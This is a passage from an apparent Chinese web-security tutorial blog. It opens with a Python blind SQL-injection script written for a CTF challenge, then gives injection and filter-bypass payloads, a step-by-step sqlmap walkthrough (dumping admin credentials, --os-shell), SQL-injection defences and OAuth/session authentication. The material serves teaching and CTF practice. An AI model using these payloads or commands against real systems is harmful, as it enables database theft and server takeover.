class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">import requests </span><br><span class="line">def getdata(pos, payload_chr): </span><br><span class="line">    &#x27;&#x27;&#x27; </span><br><span class="line">    :param pos: 盲注点</span><br><span class="line">    :param payload_chr: 字符串</span><br><span class="line">    :return: 如果pos位置是payload_chr，则返回payload_chr，反之则返回空</span><br><span class="line">    &#x27;&#x27;&#x27; </span><br><span class="line">    # 当时网络环境比较差，经常出现502的情况，当返回502或者其他信息时，使用try再次执行本函数</span><br><span class="line">    try: </span><br><span class="line">        # 用户名注意看后面的payload，这里的payload的意义为返回第一个数据库，并按位截取</span><br><span class="line">        #zaaa\&#x27; and ascii(substr((SELECT (SCHEMA_NAME) FROM information_schema.SCHEMATA limit 0,1),%d,1)) =%d and &#x27;1&#x27;=&#x27;1&#x27;%(pos,ord(payload_chr)) </span><br><span class="line">        user = &#x27;zaaa\&#x27;/**/and/**/ascii(substr((SELECT/**/(SCHEMA_NAME)/**/FROM/**/information_schema.SCHEMATA/**/limit/**/0,1),%d,1))=%d/**/and/**/\&#x27;1\&#x27;=\&#x27;1&#x27;%(pos,ord(payload_chr)) </span><br><span class="line">        # 密码，只在登录时起作用</span><br><span class="line">        passwd = &#x27;aaaaaa&#x27; </span><br><span class="line">        # 注册机登录的url </span><br><span class="line">        url_login = &#x27;http://web.l-ctf.com:55533/check.php&#x27; </span><br><span class="line">        # 注册时post的数据</span><br><span class="line">        resign_data = &#123; </span><br><span class="line">            &#x27;user&#x27;: user, </span><br><span class="line">            &#x27;pass&#x27;: passwd, </span><br><span class="line">            &#x27;vrtify&#x27;: &#x27;1&#x27;, </span><br><span class="line">            &#x27;typer&#x27;: &#x27;0&#x27;, </span><br><span class="line">            &#x27;register&#x27;: &#x27;%E6%B3%A8%E5%86%8C&#x27;, </span><br><span class="line">        &#125; </span><br><span class="line">        # 负责发送注册请求</span><br><span class="line">        r0 = requests.post(url_login, resign_data) </span><br><span class="line">        r0.close() </span><br><span class="line">        # 登录刚才注册的账号</span><br><span class="line">        login_data = &#123; </span><br><span class="line">            &#x27;user&#x27;: user, </span><br><span class="line">            &#x27;pass&#x27;: passwd, </span><br><span class="line">            &#x27;vrtify&#x27;: &#x27;1&#x27;, </span><br><span class="line">            &#x27;typer&#x27;: &#x27;0&#x27;, </span><br><span class="line">            &#x27;login&#x27;: &#x27;%E7%99%BB%E9%99%86&#x27;, </span><br><span class="line">        &#125; </span><br><span class="line">        r1 = requests.post(url_login, login_data) </span><br><span class="line">        # 截取返回头中的cookie，方便我们进入下一步的登录用户中心</span><br><span class="line">        cookie = r1.headers[&#x27;Set-Cookie&#x27;].split(&#x27;;&#x27;)[0] </span><br><span class="line">        r1.close() </span><br><span class="line">        # 用户中心登录</span><br><span class="line">        url_center = &#x27;http://web.l-ctf.com:55533/ucenter.php&#x27; </span><br><span class="line">        headers = &#123;&#x27;cookie&#x27;: cookie&#125; </span><br><span class="line">        # 登录用户中心</span><br><span class="line">        r2 = requests.get(url_center, headers=headers) </span><br><span class="line">        res = r2.content </span><br><span class="line">        # 如果返回的长度大于700，则证明这个位置的字符串是正确的，并返回这个字符串；如果</span><br><span class="line">        小于700，则返回空</span><br><span class="line">        if len(res) &gt; 700: </span><br><span class="line">            print payload_chr, ord(payload_chr) </span><br><span class="line">            return payload_chr </span><br><span class="line">        else: </span><br><span class="line">            print &#x27;.&#x27;, </span><br><span class="line">            return &#x27;&#x27; </span><br><span class="line">    except: </span><br><span class="line">        getdata(pos, payload_chr) </span><br><span class="line">if __name__ == &#x27;__main__&#x27;: </span><br><span class="line">    payloads = &#x27;abcdefghijklmnopqrstuvwxyz1234567890@_&#123;&#125;,&#x27; </span><br><span class="line">    res = &#x27;&#x27; </span><br><span class="line">    for pos in range(1, 20): </span><br><span class="line">        for payload in payloads: </span><br><span class="line">            res += getdata(pos, payload) </span><br><span class="line">            print res </span><br><span class="line"># 附上当时的注入结果</span><br><span class="line"># user--lctf </span><br><span class="line"># database--web_200 </span><br><span class="line"># table -- user </span><br><span class="line"># column -- d,admin,pass </span><br></pre></td></tr></table></figure>
+
+<h2 id="limit之后的注入"><a href="#limit之后的注入" class="headerlink" title="limit之后的注入"></a>limit之后的注入</h2><p>研究发现，在MySQL版本号大于5.0.0且小于5.6.6的时候，在如下位置中可以进行注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT &#123;injection_point&#125; </span><br></pre></td></tr></table></figure>
+
+<p>可以使用如下的Payload进行注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure </span><br><span class="line">analyse(extractvalue(rand(), concat(0x3a,version() )),1);</span><br></pre></td></tr></table></figure>
+
+<p>PROCEDURE ANALYSE的语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT ... FROM ... WHERE ... PROCEDURE ANALYSE([max_elements,[max_memory]])</span><br></pre></td></tr></table></figure>
+
+<p>max_elements:指定每列非重复值的最大值，当超过这个值的时候，MySQL不会推荐enum类型。（默认值256）</p>
+<p>max_memory（默认值8192）analyse()为每列找出所有非重复值所采用的最大内存大小。执行返回中的Optimal_fieldtype列是mysql建议采用的列。</p>
+<h2 id="常见的注入点位置"><a href="#常见的注入点位置" class="headerlink" title="常见的注入点位置"></a>常见的注入点位置</h2><p>（1）GET参数中的注入 </p>
+<p>（2）POST中的注入 </p>
+<p>（3）User-Agent中的注入:在希望发现User-Agent中的注入时，笔者在这里推荐大家使用 </p>
+<p>Burp的Repeater模块，或者Sqlmap。将Sqlmap的参数设置为level&#x3D;3， 这样Sqlmap会自动检测User-Agent中是否存在注入。 </p>
+<p>（4）Cookies中的注入 :想要发现Cookies中的注入，笔者同样推荐大家使用Burp的 </p>
+<p>Repeater模块。当然，在Sqlmap中，我们也可以设置参数为level&#x3D;2，这样Sqlmap就会自动检测Cookies中是否存在注入了。 </p>
+<p>判断注入点：通过”’“判断，如单引号被过滤，通过数字的加减进行判断 比如，<a href="http://example.com/">http://example.com/</a>? id&#x3D;2可以进行如下的尝试<a href="http://example.com/?id=3-1%EF%BC%8C%E5%A6%82%E6%9E%9C%E7%BB%93%E6%9E%9C%E7%9B%B8%E5%90%8C%EF%BC%8C%E5%88%99%E8%AF%81%E6%98%8Eid%E8%BF%99%E4%B8%AA%E8%BE%93%E5%85%A5%E7%82%B9%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8">http://example.com/?id=3-1，如果结果相同，则证明id这个输入点可能存在</a> SQL注入漏洞。 </p>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>关于SQL注入的题目一般都会涉及绕过。所以，掌握花式的绕过技术是必不可少的。我们需要熟悉数据库的各种特性，并利用开阔的思维来对SQL注入的防护措施进行绕过操作。 SQL注入的题目中一般都有绕过这样的类型，常见的绕过方式有以下几个分类。 </p>
+<h3 id="1-过滤关键字"><a href="#1-过滤关键字" class="headerlink" title="1.过滤关键字"></a>1.过滤关键字</h3><p>即过滤如select、or、from等的关键字。有些题目在过滤时没有进行递归过滤，而且刚好将关键字替换为空。这时候，我们可以使用穿插关键字的方法进行绕过操作，如：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select -- selselectect </span><br><span class="line">or -- oorr </span><br><span class="line">union -- uniunionon </span><br><span class="line">... </span><br></pre></td></tr></table></figure>
+
+<p>也可以通过大小写转换来进行绕过，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select -- SelECt </span><br><span class="line">or -- oR </span><br><span class="line">union -- uNIoN </span><br><span class="line">... </span><br></pre></td></tr></table></figure>
+
+<p>有时候，过滤函数是通过十六进制进行过滤的。我们可以对关键字的个别字母进行替换，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select -- selec\x74 </span><br><span class="line">or -- o\x72 </span><br><span class="line">union -- unio\x6e </span><br><span class="line">... </span><br></pre></td></tr></table></figure>
+
+<p>有时还可以通过双重URL编码进行绕过操作，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">form -- %25%36%36%25%36%66%25%37%32%25%36%64 </span><br><span class="line">or -- %25%36%66%25%37%32 </span><br><span class="line">union -- %25%37%35%25%36%39%25%36%65%25%36%66%25%36%65 </span><br><span class="line">... </span><br></pre></td></tr></table></figure>
+
+<h3 id="2-过滤空格"><a href="#2-过滤空格" class="headerlink" title="2.过滤空格"></a>2.过滤空格</h3><p>在一些题目中，我们发现出题人并没有对关键字进行过滤，反而对空格进行了过滤，这时候就需要用到下面这几种绕过方法。</p>
+<p>1）通过注释绕过，一般的注释符有如下几个： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># </span><br><span class="line">-- </span><br><span class="line">// </span><br><span class="line">/**/ </span><br><span class="line">;%00 </span><br></pre></td></tr></table></figure>
+
+<p>这时候，我们就可以通过这些注释符来绕过空格符，比如： </p>
+<p>select&#x2F;<strong>&#x2F;username&#x2F;</strong>&#x2F;from&#x2F;**&#x2F;user </p>
+<p>2）通过URL编码绕过，我们知道空格的编码是%20，所以可以通过二次URL编码进行绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 -- %2520 </span><br></pre></td></tr></table></figure>
+
+<p>3）通过空白字符绕过，下面列举了数据库中一些常见的可以用来绕过空格过滤的空白字符（十六进制）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SQLite3 -- 0A,0D,0C,09,20 </span><br><span class="line">MySQL5 -- 09,0A,0B,0C,0D,A0,20 </span><br><span class="line">PosgresSQL -- 0A,0D,0C,09,20 </span><br><span class="line">Oracle 11g -- 00,0A,0D,0C,09,20 </span><br><span class="line">MSSQL -- 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D, </span><br><span class="line">0E,0F,10,11,12,13,14,15,16, </span><br><span class="line">17,18,19,1A,1B,1C,1D,1E,1F,20 </span><br></pre></td></tr></table></figure>
+
+<p>4）通过特殊符号（如反引号、加号等），利用反引号绕过空格的 </p>
+<p>语句如下： </p>
+<p>.<code>..select</code>user<code>,</code>password<code>from... </code></p>
+<p>5）科学计数法绕过，语句如下： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT user,password from users where user_id=0e1union select 1,2</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/image.png" class title="img">
+
+<h3 id="3-过滤单引号"><a href="#3-过滤单引号" class="headerlink" title="3.过滤单引号"></a>3.过滤单引号</h3><p>绕过单引号过滤遇到题目最多的是魔术引号，也就是PHP配置文件</p>
+<p>php.ini中的magic_quote_gpc。 当PHP版本号小于5.4时（PHP5.3废弃魔术引号，PHP5.4移除）， 如果我们遇到的是GB2312、GBK等宽字节编码（不是网页的编码），可以在注入点增加%df尝试进行宽字节注入（如%df%27）。原理在于PHP发送请求到MySQL时字符集使用character_set_client设置值进行了一次编码，从而绕过了对单引号的过滤。</p>
+<h2 id="MySQL常用函数"><a href="#MySQL常用函数" class="headerlink" title="MySQL常用函数"></a>MySQL常用函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">system_user() → 系统用户名</span><br><span class="line">user() → 用户名</span><br><span class="line">current_user → 当前用户名</span><br><span class="line">session_user() → 连接数据库的用户名</span><br><span class="line">databases() → 数据库名</span><br><span class="line">version() → 数据库版本</span><br><span class="line">load_file() → 读取本地文件的函数</span><br><span class="line">@@datadir → 读取数据库路径</span><br><span class="line">@@basedir → 安装路径</span><br><span class="line">@@version_compile_os → 操作系统</span><br><span class="line">left() → 从左侧开始指定字符个数的字符串</span><br><span class="line">concat() → 没有分隔符的连接字符串</span><br><span class="line">concat_ws() → 含有分割符的连接字符串</span><br><span class="line">group_concat() → 连接一个组的字符串</span><br><span class="line">ascii() → 返回ASCII码</span><br><span class="line">hex() → 将字符串转换为十六进制</span><br><span class="line">md5() → 返回MD5值</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>group_concat()：将一个组内多个字符串连成一个字符串进行输出。按照以上的方法，列出的所有数据库的时候只能显示一行，<code>group_concat()</code>就可以使得所有数据显示出来。简单来说这个函数就是进行一个连接作用。</li>
+</ul>
+<h2 id="防止SQL注入"><a href="#防止SQL注入" class="headerlink" title="防止SQL注入"></a>防止SQL注入</h2><p>解决SQL注入问题的关键是对所有可能来自用户输入的数据进行严格的检查、对数据库配置使用最小权限原则。通常修复使用的方案有：</p>
+<h3 id="代码层面："><a href="#代码层面：" class="headerlink" title="***代码层面：*****"></a><em>*<em>*</em>*代码层面：****</em>*</h3><ol>
+<li>对输入进行严格的转义和过滤</li>
+<li>PDO预处理 (Java、PHP防范推荐方法：)<br>没有进行PDO预处理的SQL，在输入SQL语句进行执行的时候，web服务器自己拼凑SQL的时候有可能会把危险的SQL语句拼凑进去。但如果进行了PDO预处理的SQL，会让MYSQL自己进行拼凑，就算夹带了危险的SQL语句，也不会进行处理只会当成****参数****传进去，而不是以拼接进SQL语句传进去，从而防止了SQL注入。</li>
+</ol>
+<h3 id="网络层面："><a href="#网络层面：" class="headerlink" title="***网络层面：*****"></a><em>*<em>*</em>*网络层面：****</em>*</h3><ol>
+<li>通过WAF设备启用防SQL Inject注入策略（或类似防护系统）</li>
+<li>云端防护（360网站卫士，阿里云盾等）</li>
+</ol>
+<h2 id="sqlmap工具"><a href="#sqlmap工具" class="headerlink" title="sqlmap工具"></a>sqlmap工具</h2><p>sqlmap 是渗透常用的注入工具，支持市面上几乎所有常见的数据库</p>
+<h3 id="注入模式"><a href="#注入模式" class="headerlink" title="***注入模式*****"></a><em>*<em>*</em>*注入模式****</em>*</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">基于布尔的盲注：可以根据返回页面判断条件真假的注入；</span><br><span class="line">基于时间的盲注：用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</span><br><span class="line">基于报错的注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</span><br><span class="line">联合查询的注入：可以使用union的情况下的注入；</span><br><span class="line">堆叠查询的注入：可以同时执行多条语句的执行时的注入。</span><br></pre></td></tr></table></figure>
+
+<h3 id="参数"><a href="#参数" class="headerlink" title="***参数*****"></a><em>*<em>*</em>*参数****</em>*</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">-D 数据库名    -T 数据库表名     -C 数据库列名     -U 数据库用户名</span><br><span class="line">-D 数据库名 --tables    #获取D数据库中所有的表名</span><br><span class="line">-D 数据库名 -T 表名 --columns    #获取D数据库中T表里所有的列名</span><br><span class="line">-T 表名 -C username，password --dump   #下载T表里username，password列的数据内容</span><br><span class="line"></span><br><span class="line">-u   #-u=--url=URL ，指定url地址,get请求可以在url加上相关参数</span><br><span class="line">-r   #指定加载文件 ，适用于所有的请求和https。 流程是抓包、保存到文件、从文件加载HTTP请求；方便跳过设置一些其他参数（cookie，POST等）</span><br><span class="line">-p   #指定用url或文件中的哪个参数做注入参数</span><br><span class="line">-m   #读取文件中的url列表以批量测试</span><br><span class="line">--date    #post方式传入参数 --date &quot;id=1&amp;co=5&quot;--dbs     #显示所有的数据库</span><br><span class="line">--current-user #获取当前数据库用户</span><br><span class="line">--current-db   #获取网站当前数据库</span><br><span class="line">--is-dba  #判断当前的用户是否为管理员</span><br><span class="line">--users   #获取所有数据库用户</span><br><span class="line">--level   #测试的等级（1-5，默1）,数值&gt;=2的时候也会检查cookie里面的参数，当&gt;=3的时候将检查User-agent和Referer。</span><br><span class="line">--risk    #测试的风险（0-3，默1）,1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</span><br><span class="line">--threads #同时执行测试的线程数</span><br><span class="line">--mobile  #模拟测试手机环境站点</span><br><span class="line">--batch -smart  #不需要人确定，自动填写yes</span><br><span class="line">--batch -smart  #全自动化判断测试，不需要人确定</span><br><span class="line">--os-shell   #获取系统交互的shell</span><br><span class="line">--tamper &quot;  &quot;    #sqlmap绕过waf，需要加载绕过方式脚本，可多个</span><br><span class="line">--passwords  #尝试解码出hash密码原文</span><br><span class="line">-v   #输出信息级别:0-6 ，</span><br><span class="line">     “0”只显示python错误以及严重的信息；</span><br><span class="line">     1同时显示基本信息和警告信息（默认）；</span><br><span class="line">     “2”同时显示debug信息；</span><br><span class="line">     “3”同时显示注入的payload；</span><br><span class="line">     “4”同时显示HTTP请求；</span><br><span class="line">     “5”同时显示HTTP响应头；</span><br><span class="line">     “6”同时显示HTTP响应页面；</span><br><span class="line">     如果想看到sqlmap发送的测试payload最好的等级就是3。</span><br><span class="line"></span><br><span class="line">--file-read  #读取服务器上指定文件内容 --file-read &quot;C:/example.exe&quot;--file-write #上传本地文件 --file-write &quot;c:/1.txt&quot;--file-dest &quot;C:/php/sql.php&quot;--file-dest  #上传到服务器指定目录</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># 1.通过手工检测的方式，找到合适的注入点</span><br><span class="line">payload：&#x27;         #返回错误</span><br><span class="line">payload：and 1=1   #返回正常</span><br><span class="line">payload：and 1=2   #返回错误</span><br><span class="line">##满足以上条件即存在注入</span><br><span class="line"></span><br><span class="line"># 2.检查注入点：</span><br><span class="line">sqlmap -u &quot;http://xx.com/&quot;--data &quot;word=1&amp;number=5&quot;--batch --level3</span><br><span class="line"></span><br><span class="line"># 3.爆所有数据库信息：</span><br><span class="line">sqlmap -u &quot;http://xx.com/&quot;--data &quot;word=1&amp;number=5&quot;--batch --dbs </span><br><span class="line"></span><br><span class="line"># 4.爆当前数据库信息，爆当前用户权限。</span><br><span class="line">sqlmap -u &quot;http://xx.com/&quot;--data &quot;word=1&amp;number=5&quot;--batch --current-db --is-dba</span><br><span class="line"></span><br><span class="line"># 5.指定库名列出所有表：</span><br><span class="line">sqlmap -u &quot;http://xx.com/&quot;--data &quot;word=1&amp;number=5&quot;--batch -D news --tables </span><br><span class="line"></span><br><span class="line"># 6.指定库名表名列出所有字段：</span><br><span class="line">sqlmap -u &quot;http://xx.com/&quot;--data &quot;word=1&amp;number=5&quot;--batch -D news -T admin --column </span><br><span class="line"></span><br><span class="line"># 7.指定库名表名字段dump出指定字段：</span><br><span class="line">sqlmap -u &quot;http://xx.com/&quot;--data &quot;word=1&amp;number=5&quot;--batch -D news -T admin -C name,pswd --dump </span><br><span class="line"></span><br><span class="line"># 8.加载脚本绕过防火墙</span><br><span class="line">sqlmap -u &quot;http://xx.com/&quot;--data &quot;word=1&amp;number=5&quot;--tamper randomcase.py</span><br><span class="line"></span><br><span class="line"># 9.爆当前的用户名称</span><br><span class="line">sqlmap -u &quot;http://xx.com/&quot;--data &quot;word=1&amp;number=5&quot;--current-user</span><br><span class="line"></span><br><span class="line"># 10.爆当前用户密码</span><br><span class="line">sqlmap -u &quot;http://xx.com/&quot;--data &quot;word=1&amp;number=5&quot;--passwods</span><br><span class="line"></span><br><span class="line"># 11.连接系统交互shell</span><br><span class="line">sqlmap -u &quot;http://xx.com/&quot;--data &quot;word=1&amp;number=5&quot;--os-shell</span><br></pre></td></tr></table></figure>
+
+<h1 id="认证机制"><a href="#认证机制" class="headerlink" title="认证机制"></a>认证机制</h1><p>常用的认证机制,主要有:</p>
+<ul>
+<li>HTTP Basic Auth (HTTP基本身份验证)</li>
+<li>OAuth(开放授权)</li>
+<li>Cookie Auth</li>
+<li>Token Auth</li>
+</ul>
+<h2 id="HTTP-Basic-Auth-HTTP基本身份验证"><a href="#HTTP-Basic-Auth-HTTP基本身份验证" class="headerlink" title="HTTP Basic Auth(HTTP基本身份验证)"></a>HTTP Basic Auth(HTTP基本身份验证)</h2><p>从HTTP&#x2F;1. 1 就定义的认证方式,简单点说明就是每次请求API时都提供用户的username:和password,Basic Auth:是配合RESTful API使用的最简单的认证方式,只需提供用户名密码即可,但由于有把用户名密码暴露给第三方客户端的风险,在生产环境下被使用的越来越少。因此,在开发对外开放的RESTful APIE时,尽量避免采用HTTP Basic Auth</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/Jj3oGtrWxxjpVrhK7ZpAff.png" class title="img">
+
+<h2 id="OAuth-OAuth-开放授权"><a href="#OAuth-OAuth-开放授权" class="headerlink" title="OAuth OAuth(开放授权)"></a>OAuth OAuth(开放授权)</h2><p>是一个开放的授权标准,允许用户让第三方应用访问该用户在某一web服务上存储的私密的资源(如照片,视频,联系人列表),而无需将用户名和密码提供给第三方应用。OAuth.允许用户提供一个令牌,而不是用户名和密码来访问他们存放在特定服务提供者的数据。</p>
+<p>Access Token是客户端访问资源服务器的令牌。通过这个令牌，客户端可以访问第三方应用上受保护的资源。但是Access Token有效期一般较短（这可以降低Acces Token泄漏而带来的风险），当Access Token过期时用户就需要频繁的授权客户端访问资源，这非常影响用户体验，因此引入Refresh Token来获取新的Access Token。</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/FkXJNpnit8XHTagHkpwPHL.png" class title="img">
+
+<h3 id><a href="#" class="headerlink" title></a></h3><p>  为了获得访问令牌(Token)，客户端需要先从资源所有者(用户)那里获得授权。授权是以授权许可(Grant Type)的形式来表示的。OAuth定义了四种授权类型：</p>
+<h3 id="1、授权码模式（Authorization-Code-Grant）"><a href="#1、授权码模式（Authorization-Code-Grant）" class="headerlink" title="***1、授权码模式（Authorization Code Grant）*****"></a><em>*<em>*</em>*1、授权码模式（Authorization Code Grant）****</em>*</h3><img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/3MUs3Jcx4KF7ucC4bfx9uA.png" class title="img">
+
+<p>当用户访问资源时，比如在网易云音乐中使用第三方登录功能，例如QQ登录，那么这里的资源就是用户的QQ昵称和头像等信息。此时第三方应用（网易云音乐）将发送请求到授权服务器（QQ）去获取授权，此时授权服务器（QQ）将返回一个界面给用户，用户需要登录到QQ，并同意授权网易云音乐获得某些信息（资源）。当用户同意授权后，授权服务器将返回一个授权码（Authorization Code）给第三方应用，此时第三方应用在通过client_id、client_secret（这是需要第三方应用在授权服务器去申请的）和授权码去获得Access Token和Refresh Token，此时授权码将失效。然后就是第三方应用通过Access Token去资源服务器请求资源了，资源服务器校验Access Token成功后将返回资源给第三方应用。</p>
+<h3 id="2、隐式授权（Implicit-Grant）"><a href="#2、隐式授权（Implicit-Grant）" class="headerlink" title="2、隐式授权（Implicit Grant）"></a>2、隐式授权（Implicit Grant）</h3><p>​       隐式授权又称简化授权模式，它和授权码模式类似，只不过少了获取授权码的步骤，是直接获取令牌token的，且没有Refresh Token，适用于公开的浏览器单页应用。因为令牌直接从授权服务器返回，所以没有安全保证，令牌容易因为被拦截窃听而泄露。</p>
+<h3 id="3、密码模式（Resource-Owner-Password-Credentials-Grant）"><a href="#3、密码模式（Resource-Owner-Password-Credentials-Grant）" class="headerlink" title="3、密码模式（Resource Owner Password Credentials Grant）"></a>3、密码模式（Resource Owner Password Credentials Grant）</h3><img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/7aikSgUY3iTC6NN62M4wNK.png" class title="img">
+
+<p>首先资源所有者（用户）提供自己的用户名和密码给客户端（Client），然后客户端（Client）携带从用户那里获取的凭证去授权服务器请求Token， 授权服务器对客户端进行身份认证，并校验资源所有者的凭证，如果都校验通过，则发放Token。</p>
+<p>适用范围：只适用于应用是受信任的场景。一个典型的例子是同一个企业内部的不同产品要使用本企业的 Oauth2.0 体系。在这种情况下，由于是同个企业，不需要向用户展示“xxx将获取以下权限”等字样并询问用户的授权意向，而只需进行用户的身份认证即可。这个时候，只需要用户输入凭证并直接传递给鉴权服务器进行授权即可。</p>
+<h3 id="4、客户端授权模式（Client-Credentials-Grant）"><a href="#4、客户端授权模式（Client-Credentials-Grant）" class="headerlink" title="4、客户端授权模式（Client Credentials Grant）"></a>4、客户端授权模式（Client Credentials Grant）</h3><img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/jpKTb4BJVRsij9yreqJbPD.png" class title="img">
+
+<p>客户端（Client）通过Client_id和Client_secret去授权服务器请求Token，授权服务器认证Client_id和Client_secret是否正确，若正确则发放Token给客户端（Client）。最后客户端通过AccessToken请求资源。</p>
+<p>适用范围：只适用于应用是受信任的场景。</p>
+<h2 id="Cookie-OAuth"><a href="#Cookie-OAuth" class="headerlink" title="Cookie OAuth"></a>Cookie OAuth</h2><h2 id="Token-OAuth"><a href="#Token-OAuth" class="headerlink" title="Token OAuth"></a>Token OAuth</h2><p>一般在TCP三次握手就创建了http会话，在会话中可以传递信息，在TCP关闭连接后就关闭会话。HTTP协议是基于TCP协议的，http1.1中，一般一个连接就只能处理一个请求，所以在需要权限身份认证的时候就需要有一种凭证，才能使得每次请求服务器都知道是你，相当于建立了连续的会话，也就是每次的请求都带有自己的身份凭证。</p>
+<h2 id="session身份认证"><a href="#session身份认证" class="headerlink" title="session身份认证"></a>session身份认证</h2><p>php中的session</p>
+<ul>
+<li>站在客户端角度，每次登录帐号密码之后，会有一串类似于短秘钥（PHPSESSID）之类的东西，他只属于你，证明你的身份。</li>
+<li>站在服务器端，在你进行身份认证之后，会在服务器端保存一个以PHPSESSID为名的****文件****来储存你的身份，账号等各种信息，在用户每次提交带有session的请求时，自动去搜索这个以session命名的文件，查看里面的反序列化信息(也就是你的身份等信息)。</li>
+</ul>
+<ol>
+<li>生成PHPSESSID:php中并不是在登录之后才会给PHPSESSID,而是先给PHPSESSID再去登录，在<code>session_start();</code>开始之后,http响应头部信息会返回set-cookie:PHPSESSID&#x3D;XXXXXXX,浏览器便会自动创建这个cookie,并且关联这个域名。同时,也在服务器端创建一个以Session ID命名的文件,此时你并没有登录,但是已经给了你相应的session。</li>
+</ol>
